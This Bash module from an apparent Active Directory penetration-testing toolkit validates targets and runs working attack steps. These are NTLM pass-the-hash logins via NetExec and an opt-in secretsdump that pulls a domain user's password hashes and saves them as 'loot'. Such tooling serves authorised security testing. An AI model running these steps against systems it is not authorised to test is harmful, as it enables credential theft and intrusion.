#!/usr/bin/env bash
# shellcheck disable=SC2034 # Resolved target state is consumed by service modules.

declare -gA SPS_VALIDATION_CACHE=()

sps_is_ipv4() {
    local address="${1:-}"
    local octet
    local -a octets
    [[ "$address" =~ ^[0-9]+([.][0-9]+){3}$ ]] || return 1
    IFS=. read -r -a octets <<< "$address"
    ((${#octets[@]} == 4)) || return 1
    for octet in "${octets[@]}"; do
        [[ "$octet" =~ ^[0-9]+$ ]] && ((10#$octet <= 255)) || return 1
    done
}

is_ipv4() {
    sps_is_ipv4 "$1"
}

sps_is_hostname() {
    local hostname="${1:-}"
    local label
    local -a labels
    ((${#hostname} >= 1 && ${#hostname} <= 253)) || return 1
    [[ "$hostname" != .* && "$hostname" != *. && "$hostname" != *..* ]] || return 1
    IFS=. read -r -a labels <<< "$hostname"
    for label in "${labels[@]}"; do
        ((${#label} >= 1 && ${#label} <= 63)) || return 1
        [[ "$label" =~ ^[A-Za-z0-9]([A-Za-z0-9-]*[A-Za-z0-9])?$ ]] || return 1
    done
}

sps_command_available() {
    local command_name="$1"
    local cache_key="command:$command_name"
    if [[ -n "${SPS_VALIDATION_CACHE[$cache_key]+x}" ]]; then
        [[ "${SPS_VALIDATION_CACHE[$cache_key]}" == true ]]
        return
    fi
    if command -v "$command_name" > /dev/null 2>&1; then
        SPS_VALIDATION_CACHE["$cache_key"]=true
        return 0
    fi
    SPS_VALIDATION_CACHE["$cache_key"]=false
    return 1
}

sps_netexec_command() {
    local candidate
    for candidate in nxc netexec; do
        if sps_command_available "$candidate"; then
            printf '%s\n' "$candidate"
            return 0
        fi
    done
    return 1
}

sps_run_optional_kerberos_auth_check() {
    if [[ "${KERBEROS_AUTH_CHECKED:-false}" == true ]]; then
        return 0
    fi

    KERBEROS_AUTH_CHECKED=true
    kerberos_auth_check || true
    return 0
}

sps_build_netexec_hash_args() {
    local result_name="$1"
    local user="$2"
    local domain="$3"
    local ntlm_hash="$4"
    local -n result_ref="$result_name"

    result_ref=(-u "$user" -H "$ntlm_hash" -d "$domain")
}

sps_run_netexec_hash_check() {
    local protocol="$1"
    local target="$2"
    local client output display_command rc=0
    local -a auth_args=()

    if ! client="$(sps_netexec_command)"; then
        warn "NTLM-hash check for $protocol skipped: NetExec is unavailable"
        return 0
    fi

    sps_build_netexec_hash_args auth_args "$AUTH_USER" "$AUTH_DOMAIN" "$AUTH_NTLM_HASH"
    display_command="$(sps_redact "$(sps_shell_join "$client" "$protocol" "$target" "${auth_args[@]}")")"
    info "Testing $protocol authentication with the supplied NTLM hash"
    echo -e "        ${GREEN}${display_command}${RESET}"
    record_command "${protocol^^}" "NTLM-hash credential validation" "$display_command"

    output=$(timeout 20 "$client" "$protocol" "$target" "${auth_args[@]}" 2>&1) || rc=$?
    if grep -Eq "^${protocol^^}[[:space:]].*\[\+\]" <<< "$output"; then
        success "${protocol^^} NTLM-hash authentication successful"
        case "$protocol" in
            ldap) LDAP_AUTH_BIND=true; LDAP_ACCESS_CONFIRMED=true ;;
            mssql) MSSQL_AUTH_OK=true; MSSQL_INSTANCE_FOUND=true ;;
            rdp) RDP_AUTH_OK=true; RDP_AUTH_STATUS="success"; RDP_AUTH_PROVIDER="netexec" ;;
            winrm) WINRM_DETECTED=true; WINRM_AUTH_DETECTED=true ;;
        esac
        return 0
    fi

    warn "${protocol^^} NTLM-hash authentication failed or was not permitted (NetExec exit $rc)"
    return 0
}

sps_run_secretsdump_hash_check() {
    local tool="" hash_pair target_identity evidence_file display_command output rc=0
    local candidate
    local -a command_args=()

    for candidate in impacket-secretsdump secretsdump.py; do
        if command -v "$candidate" >/dev/null 2>&1; then
            tool="$candidate"
            break
        fi
    done
    if [[ -z "$tool" ]]; then
        warn "Secretsdump check skipped: impacket-secretsdump is unavailable"
        return 0
    fi

    hash_pair=":${AUTH_NTLM_HASH}"
    target_identity="${AUTH_DOMAIN}/${AUTH_USER}@${TARGET_IPV4}"
    evidence_file="${EVIDENCE_DIR:-.}/secretsdump_$(sanitize_name "$SECRETSDUMP_TARGET_USER")_$(date +%Y%m%d_%H%M%S).txt"
    command_args=(-hashes "$hash_pair" -just-dc-user "$SECRETSDUMP_TARGET_USER" "$target_identity")
    display_command="$(sps_redact "$(sps_shell_join "$tool" "${command_args[@]}")")"

    info "Running the opt-in secretsdump check for $SECRETSDUMP_TARGET_USER"
    echo -e "        ${GREEN}${display_command}${RESET}"
    record_command "SMB" "Targeted secretsdump validation" "$display_command"
    output=$(timeout 90 "$tool" "${command_args[@]}" 2>&1) || rc=$?
    printf '%s\n' "$output" > "$evidence_file"
    chmod 600 "$evidence_file" 2>/dev/null || true

    if grep -Eq ':[0-9]+:[[:xdigit:]]{32}:[[:xdigit:]]{32}:' <<< "$output"; then
        critical "Secretsdump returned credential material for $SECRETSDUMP_TARGET_USER"
        record_loot "secretsdump_hash" "$SECRETSDUMP_TARGET_USER" "$evidence_file"
    else
        warn "Secretsdump did not return a hash for $SECRETSDUMP_TARGET_USER (exit $rc)"
        record_loot "secretsdump_output" "$SECRETSDUMP_TARGET_USER" "$evidence_file"
    fi
    return 0
}

sps_validate_runtime() {
    local command_name
    local -a missing=()
    local -a required=(bash timeout mktemp sort awk sed grep date tr mkdir touch mv rm)
    if [[ "${LOOT_ENABLED:-true}" == true ]]; then
        required+=(cat chmod cp dirname find wc)
    fi
    for command_name in "${required[@]}"; do
        sps_command_available "$command_name" || missing+=("$command_name")
    done
    if ((${#missing[@]})); then
        error "Missing mandatory local runtime command(s): ${missing[*]}"
        return 4
    fi
}

sps_optional_tool_check() {
    local feature="$1"
    shift
    local command_name
    for command_name in "$@"; do
        if sps_command_available "$command_name"; then
            debug "$feature preflight: found $command_name"
            return 0
        fi
    done
    debug "$feature preflight: optional tool unavailable (${*}); module will be skipped if reached"
    return 1
}

sps_optional_wordlist_check() {
    local feature="$1" wordlist="$2"
    if [[ -r "$wordlist" && -s "$wordlist" ]]; then
        debug "$feature preflight: found wordlist $wordlist"
        return 0
    fi
    debug "$feature preflight: wordlist unavailable ($wordlist); built-in fallback will be used if reached"
    return 1
}

sps_run_optional_preflight() {
    [[ "${SKIP_PREFLIGHT:-false}" == true ]] && {
        debug "Optional preflight disabled by --skip-preflight"
        return 0
    }

    [[ "${ENABLE_SERVICE_DETECT:-false}" == true ]] && sps_optional_tool_check "service detection" nmap || true
    sps_optional_tool_check "NetBIOS discovery" nmblookup nbtscan || true
    if [[ "${ENABLE_WEB_ENUM:-false}" == true ]]; then
        sps_optional_tool_check "web enumeration" ffuf || true
        sps_optional_wordlist_check "web enumeration" \
            "${WEB_WORDLIST:-/usr/share/seclists/Discovery/Web-Content/raft-small-words.txt}" || true
    fi
    if [[ "${ENABLE_VHOST:-false}" == true ]]; then
        sps_optional_tool_check "VHost discovery" ffuf curl || true
        sps_optional_wordlist_check "VHost discovery" \
            "${VHOST_WORDLIST:-/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt}" || true
    fi
    [[ "${ENABLE_DNS_ENUM:-false}" == true ]] && sps_optional_tool_check "DNS enumeration" dig || true
    if [[ "${DNS_BRUTE:-false}" == true ]]; then
        sps_optional_wordlist_check "DNS brute force" \
            "${DNS_WORDLIST:-/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt}" || true
    fi
    [[ "${ENABLE_BH_EXPORT:-false}" == true ]] && sps_optional_tool_check "BloodHound" bloodhound-ce-python bloodhound-python || true
    [[ "${ENABLE_ADCS:-false}" == true ]] && sps_optional_tool_check "AD CS" certipy-ad || true
    [[ -n "${AUTH_NTLM_HASH:-}" ]] && sps_optional_tool_check "NTLM-hash authentication" netexec nxc || true
    [[ "${ENABLE_SECRETSDUMP:-false}" == true ]] && sps_optional_tool_check "Targeted secretsdump" impacket-secretsdump secretsdump.py || true
    [[ "${ENABLE_MSSQL_ENUM:-false}" == true || "${ENABLE_MSSQL_BRUTE:-false}" == true ]] &&
        sps_optional_tool_check "MSSQL" netexec crackmapexec || true
}

sps_validate_selected_features() {
    local missing_creds=false
    if [[ -z "${AUTH_USER:-}" ]] || [[ -z "${AUTH_PASS:-}" && -z "${AUTH_NTLM_HASH:-}" ]]; then
        missing_creds=true
    fi

    if [[ "$missing_creds" == true ]]; then
        if [[ "${ENABLE_BH_EXPORT:-false}" == true || "${ENABLE_KERBROAST:-false}" == true || "${ENABLE_ADCS:-false}" == true ||
            "${ENABLE_MSSQL_PRIVESC:-false}" == true || "${ENABLE_MSSQL_CMDSHELL:-false}" == true ]]; then
            warn "Credentials are absent; selected credentialed modules will be skipped when reached."
            debug "Credential-independent scan and discovery remain enabled"
        fi
    fi

    if [[ -n "${AUTH_USER:-}" && -z "${AUTH_PASS:-}" && -z "${AUTH_NTLM_HASH:-}" ]]; then
        debug "Username supplied without a password; authenticated modules remain disabled"
    elif [[ -z "${AUTH_USER:-}" ]] && [[ -n "${AUTH_PASS:-}" || -n "${AUTH_NTLM_HASH:-}" ]]; then
        debug "Password supplied without a username; authenticated modules remain disabled"
    fi
}

sps_reverse_lookup() {
    local address="$1"
    local hostname=""
    if sps_command_available getent; then
        hostname="$(getent hosts "$address" 2> /dev/null | awk 'NR == 1 {print $2}')"
    elif sps_command_available dig; then
        hostname="$(dig +short -x "$address" 2> /dev/null | sed 's/[.]$//' | head -n 1)"
    elif sps_command_available host; then
        hostname="$(host "$address" 2> /dev/null | awk '/domain name pointer/ {sub(/[.]$/, "", $NF); print $NF; exit}')"
    fi
    printf '%s' "$hostname"
}

sps_forward_lookup() {
    local hostname="$1"
    local address=""
    if sps_command_available getent; then
        address="$(getent ahostsv4 "$hostname" 2> /dev/null | awk 'NR == 1 {print $1}')"
    elif sps_command_available dig; then
        address="$(dig +short A "$hostname" 2> /dev/null | awk 'NR == 1 {print}')"
    elif sps_command_available host; then
        address="$(host -t A "$hostname" 2> /dev/null | awk '/has address/ {print $NF; exit}')"
    fi
    printf '%s' "$address"
}

sps_resolve_target() {
    local input="$1"
    local resolved_ip=""
    local reverse_name=""

    ORIGINAL_TARGET="$input"
    info "Validating target: $input"

    if sps_is_ipv4 "$input"; then
        TARGET_IPV4="$input"
        if [[ "${SKIP_PREFLIGHT:-false}" != true ]]; then
            reverse_name="$(sps_reverse_lookup "$input")"
            if [[ -n "$reverse_name" ]]; then
                ORIGINAL_HOSTNAME="$reverse_name"
                TARGET_FQDN="$reverse_name"
                printf '%s %s\n' "$input" "$reverse_name" >> "$HOSTS_FILE"
                printf '%s\n' "$reverse_name" >> "$DISCOVERED_HOSTS"
                info "Reverse DNS resolved $input to $reverse_name"
            else
                debug "No reverse DNS result for $input"
            fi
        else
            debug "Skipped optional reverse DNS lookup"
        fi
        return 0
    fi

    if ! sps_is_hostname "$input"; then
        error "Invalid target; expected one IPv4 address or DNS hostname: $input"
        return 3
    fi

    resolved_ip="$(sps_forward_lookup "$input")"
    if ! sps_is_ipv4 "$resolved_ip"; then
        error "Could not resolve hostname to IPv4: $input"
        return 3
    fi

    ORIGINAL_HOSTNAME="$input"
    TARGET_FQDN="$input"
    TARGET="$resolved_ip"
    TARGET_IPV4="$resolved_ip"
    printf '%s %s\n' "$resolved_ip" "$input" >> "$HOSTS_FILE"
    printf '%s\n' "$input" >> "$DISCOVERED_HOSTS"
    info "Resolved $input to $resolved_ip"
}
